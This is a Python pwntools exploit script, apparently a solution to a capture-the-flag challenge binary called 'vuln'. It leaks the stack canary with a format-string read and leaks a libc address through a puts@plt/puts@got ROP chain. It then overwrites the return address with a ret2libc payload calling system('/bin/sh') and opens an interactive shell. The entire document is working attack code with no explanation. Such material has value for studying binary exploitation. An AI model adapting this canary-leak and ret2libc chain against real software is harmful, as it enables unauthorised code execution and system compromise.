from pwn import *

elf  = context.binary = ELF('./vuln')
libc = ELF("/lib/i386-linux-gnu/libc.so.6")


p = process('./vuln')


# -------------------------
# Leak Canary
# -------------------------


magic_number = b"-351"










p.recvuntil("What number would you like to guess?")
p.sendline(magic_number)   # get into win() again

p.sendline(b"%171$p")
p.recvuntil("Congrats: ")
canary = int(p.recvline().decode().strip(), 16)
print("Canary:", hex(canary))


# -------------------------
# Leak puts() address
# -------------------------
puts_plt  = elf.plt['puts']
main_addr = elf.symbols['main']
puts_got  = elf.got['puts']

p.recvuntil("What number would you like to guess?")
p.sendline(magic_number)   # trigger win() again

# build payload: buffer(512) + canary + padding(12) + puts@plt + main + puts@got
payload = flat(
    b"A" * 512,
    p32(canary),       # include canary
    b"B" * 12,         # padding (12)
    puts_plt,          # ret -> puts@plt
    main_addr,         # return to main
    puts_got           # argument to puts
)

p.recvuntil(b"Name? ")
p.sendline(payload)

# skip winner line
p.recvuntil(b"Congrats: ")
junk = p.recvline()

# read the actual leaked bytes
leak_data = p.recvn(5)
addr_bytes = leak_data[-4:]

# print nicely
print("Leak:", ''.join(f'\\x{b:02x}' for b in addr_bytes))

puts_leak = u32(addr_bytes)
print("Leaked puts address:", hex(puts_leak))


# -------------------------
# Compute system & "/bin/sh"
# -------------------------
binsh_offset = next(libc.search(b'/bin/sh'))
libc_base    = puts_leak - libc.symbols['puts']

system_addr  = libc_base + libc.symbols['system']
print("system() address:", hex(system_addr))

binsh_addr   = libc_base + binsh_offset
print("'/bin/sh' address:", hex(binsh_addr))


# -------------------------
# Final Exploit Payload
# -------------------------
p.recvuntil(b"What number would you like to guess?")
p.sendline(magic_number)   # trigger win() again

payload = (
    b"A"*512 +
    p32(canary) +
    b"A"*12 +
    p32(system_addr) +
    p32(elf.functions['win'].address) +
    p32(binsh_addr)
)

p.sendline(payload)
p.recvlines(2)
p.interactive()
